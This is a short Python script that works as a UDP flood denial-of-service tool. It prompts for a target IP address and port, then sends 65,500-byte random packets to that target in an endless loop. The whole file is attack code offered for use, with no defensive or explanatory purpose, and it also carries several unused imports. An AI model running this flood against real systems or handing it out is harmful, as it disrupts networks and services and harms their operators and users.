import webbrowser
import os
import time
import random
import socket
import urllib.request
import urllib

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65500)

server_ip = input('Target IP: ')
target_port = input('Target Port: ')

print("Running....")

while True:
        sock.sendto(bytes, (server_ip, int(target_port)))
